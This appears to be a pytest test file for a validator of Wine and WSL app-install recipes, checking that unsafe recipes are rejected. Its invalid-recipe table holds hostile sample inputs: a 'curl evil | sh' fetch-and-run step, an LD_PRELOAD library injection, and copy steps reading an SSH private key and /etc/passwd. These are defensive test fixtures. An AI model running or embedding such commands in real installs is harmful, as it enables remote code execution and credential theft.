import copy
from pathlib import Path

import pytest

from whistle_recipes.validate import main, validate, validate_file

RECIPES = Path(__file__).parent.parent / "recipes"

BASE = {
    "schema_version": 1,
    "id": "org.example.App",
    "app": "org.example.App",
    "runtime": "wine",
    "installer": {"type": "download", "url": "https://example.org/setup.exe", "sha256": "a" * 64},
    "steps": [{"run_installer": {"args": ["/S"]}}],
    "launchers": [{"name": "App", "exe": "C:\\Program Files\\App\\app.exe"}],
}

WSL_BASE = {
    "schema_version": 1,
    "id": "org.example.Tool",
    "app": "org.example.Tool",
    "runtime": "wsl",
    "installer": {"type": "package", "manager": "apt", "ref": "tool"},
    "launchers": [{"name": "Tool", "exe": "tool"}],
}


@pytest.mark.parametrize("path", sorted(RECIPES.glob("*.yaml")), ids=lambda p: p.stem)
def test_shipped_recipes_are_valid(path):
    assert validate_file(path) == []


def test_minimal_recipes_are_valid():
    assert validate(BASE) == []
    assert validate(WSL_BASE) == []


def test_wine_recipes_may_leave_launchers_to_the_installer():
    spec = {k: v for k, v in BASE.items() if k != "launchers"}
    assert validate(spec) == []
    wsl = {k: v for k, v in WSL_BASE.items() if k != "launchers"}
    assert validate(wsl) == ["launchers: wsl recipes must list their launchers"]


def set_(path, value):
    def mutate(spec):
        *parents, last = path
        node = spec
        for key in parents:
            node = node[key]
        node[last] = value
    return mutate


def delete(*path):
    def mutate(spec):
        *parents, last = path
        node = spec
        for key in parents:
            node = node[key]
        del node[last]
    return mutate


INVALID = {
    "shell step": set_(["steps"], [{"shell": "curl evil | sh"}]),
    "two actions in one step": set_(["steps"], [{"run_installer": {}, "winetricks": ["corefonts"]}]),
    "plain http download": set_(["installer", "url"], "http://example.org/setup.exe"),
    "uppercase hash": set_(["installer", "sha256"], "A" * 64),
    "download without hash": delete("installer", "sha256"),
    "extra installer key": set_(["installer", "prompt"], "hi"),
    "LD_PRELOAD env": set_(["steps"], [{"env": {"LD_PRELOAD": "/tmp/x.so"}}, {"run_installer": {}}]),
    "copy path traversal": set_(["steps"], [{"copy": {"from": "../../.ssh/id_rsa", "to": "C:\\x"}}]),
    "copy absolute source": set_(["steps"], [{"copy": {"from": "/etc/passwd", "to": "C:\\x"}}]),
    "launcher outside prefix": set_(["launchers", 0, "exe"], "/usr/bin/bash"),
    "package installer on wine": set_(["installer"], {"type": "package", "manager": "apt", "ref": "x"}),
    "proton pin on wine runtime": set_(["requires"], {"proton": "GE-Proton9-20"}),
    "unknown top-level key": set_(["script"], "x"),
    "unquoted numeric version_range": set_(["version_range"], 2016),
    "installer never used": set_(["steps"], [{"winetricks": ["corefonts"]}]),
    "run_installer twice": set_(["steps"], [{"run_installer": {}}, {"run_installer": {}}]),
    "duplicate launcher names": set_(["launchers"], [BASE["launchers"][0]] * 2),
    "health check unknown launcher": set_(["health_check"], {"launcher": "Nope"}),
    "health check bad regex": set_(["health_check"], {"launcher": "App", "window_title": "("}),
    "registry key outside HKCU/HKLM": set_(["steps"], [{"registry": {"key": "HKCR\\x", "value": {"a": 1}}}, {"run_installer": {}}]),
}


@pytest.mark.parametrize("mutate", INVALID.values(), ids=INVALID.keys())
def test_invalid_recipes_are_rejected(mutate):
    spec = copy.deepcopy(BASE)
    mutate(spec)
    assert validate(spec) != []


WSL_INVALID = {
    "wine steps on wsl": set_(["steps"], [{"winetricks": ["corefonts"]}]),
    "download installer on wsl": set_(["installer"], BASE["installer"]),
    "windows launcher on wsl": set_(["launchers", 0, "exe"], "C:\\x.exe"),
    "vm fallback on wsl": set_(["fallback"], "vm"),
}


@pytest.mark.parametrize("mutate", WSL_INVALID.values(), ids=WSL_INVALID.keys())
def test_invalid_wsl_recipes_are_rejected(mutate):
    spec = copy.deepcopy(WSL_BASE)
    mutate(spec)
    assert validate(spec) != []


def test_id_must_match_file_name(tmp_path):
    f = tmp_path / "org.example.Other.yaml"
    f.write_text("schema_version: 1\nid: org.example.App\n")
    spec = copy.deepcopy(BASE)
    assert validate(spec, path=f) == ["id: must match the file name ('org.example.Other')"]


def test_cli(capsys):
    assert main([str(RECIPES)]) == 0
    assert "3/3 recipes valid" in capsys.readouterr().out
